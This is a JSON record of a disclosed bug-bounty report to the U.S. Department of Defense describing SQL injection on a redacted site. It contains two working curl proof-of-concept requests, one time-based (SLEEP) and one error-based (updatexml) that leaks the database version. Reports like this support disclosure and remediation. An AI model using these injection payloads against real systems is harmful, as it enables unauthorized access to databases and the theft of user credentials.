{
  "id": 232378,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzIzNzg=",
  "url": "https://hackerone.com/reports/232378",
  "title": "SQL Injection on https://████████/",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-05-27T07:15:51.436Z",
  "submitted_at": "2017-05-27T07:15:51.436Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cdl",
    "url": "/cdl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-05-12T19:59:55.610Z",
  "bug_reporter_agreed_on_going_public_at": "2022-05-03T13:10:23.666Z",
  "team_member_agreed_on_going_public_at": "2022-05-12T19:59:55.501Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nhttps://████ is vulnerable to SQL Injection.\n\n**Description:**\nThe `███████` parameter in `https://█████████/██████` does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!\n\n## Impact\nThis is a **high impact** vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel! \n\n## Step-by-step Reproduction Instructions\n#### Proof of Concept #1:\n1. Open up your terminal!\n2. Paste this command \n\n```\ncurl -i -s -k  -X $'POST' \\\n    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/██████████?█████████=K' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n    --data-binary $'█████=K*\\' OR SLEEP(10) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=███████&emailid2=█████████' \\\n    $'https://██████/████████'\n```\n3. Now the server will sleep for 10 seconds and then respond! \n\n\n#### Proof of Concept #2: \n```\ncurl -i -s -k  -X $'POST' \\\n    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/███████?█████=K' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \\\n    --data-binary $'█████=K*\\' OR updatexml(null,concat(0x3a3a,version()),null) AND \\'aSgl\\'=\\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=█████████&emailid2=██████████' \\\n    $'https://██████/███'\n```\nYou will see: \"<br><br>You have this list added to your current optionsXPATH syntax error: '::`████`'\"\nwhich is the MySQL version! \n\n**information:**\nCurrent User: `███████@localhost`\nDatabases: `█████`\nVersion: `███`\n\n## Suggested Mitigation/Remediation Actions\nSanitize sanitize sanitize!!\n\nThanks as always ;)\n-Corben Douglas (@sxcurity)",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 8,
  "voters": [
    "zy9ard3",
    "n7ec",
    "shivammusic",
    "barzan-sindi",
    "tomasluk",
    "conorwilliam",
    "bbrriiee",
    "m4khn0"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
